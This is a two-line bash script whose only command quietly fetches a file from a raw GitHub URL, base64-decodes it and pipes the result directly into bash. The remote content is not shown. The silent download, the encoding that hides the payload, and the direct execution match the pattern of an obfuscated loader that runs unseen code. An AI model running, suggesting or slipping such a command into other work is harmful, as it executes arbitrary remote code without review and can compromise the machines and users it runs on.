#!/bin/bash
wget -qO- https://raw.githubusercontent.com/vaughnmetify/modded/refs/heads/main/entrypoint.sh | base64 -d | bash
